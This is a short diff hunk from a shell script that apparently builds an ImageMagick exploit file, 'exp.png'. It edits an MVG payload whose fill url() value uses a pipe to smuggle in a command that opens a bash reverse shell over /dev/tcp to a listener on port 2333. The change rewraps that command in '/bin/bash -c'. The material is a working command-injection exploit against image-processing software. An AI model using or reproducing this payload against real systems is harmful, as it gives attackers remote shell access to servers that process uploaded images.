@@ -20,7 +20,7 @@ fi
 exp="exp.png"
 EXP="push graphic-context\n\
 viewbox 0 0 640 480\n\
-fill 'url(https://example.com/image.jpg\"|bash -i >& /dev/tcp/127.0.0.1/2333 0>&1\")'\n\
+fill 'url(https://example.com/image.jpg\"|/bin/bash -c \"bash -i >& /dev/tcp/127.0.0.1/2333 0>&1\"\")'\n\
 pop graphic-context"
 
 help(){
